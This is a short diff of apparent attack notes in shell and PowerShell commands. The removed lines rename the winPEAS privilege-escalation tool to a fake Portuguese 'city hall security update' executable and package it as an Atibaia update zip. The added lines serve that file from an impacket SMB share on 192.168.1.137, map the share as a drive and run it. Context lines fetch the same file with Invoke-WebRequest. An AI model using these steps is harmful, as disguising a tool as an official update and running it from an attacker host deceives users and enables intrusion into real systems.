@@ -25,8 +25,14 @@ sudo apt update
 sudo apt install apache2 php libapache2-mod-php -y
 sudo systemctl restart apache2
 
-mv winPEASx64.exe Atualizacao_Seguranca_Prefeitura_2021.exe
-zip -r Pacote_Atualizacao_Completo_Atibaia.zip Atualizacao_Seguranca_Prefeitura_2021.exe
+sudo impacket-smbserver share $(pwd) -smb2support
+
+\\192.168.1.137\share\Atualizacao_Seguranca_Prefeitura_2021.exe
+
+net use Z: \\192.168.1.137\share
+Z:\Atualizacao_Seguranca_Prefeitura_2021.exe
+
+
 
 Invoke-WebRequest -Uri "http://192.168.1.137/Atualizacao_Seguranca_Prefeitura_2021.exe" -OutFile "Atualizacao_Seguranca_Prefeitura_2021.exe"
 
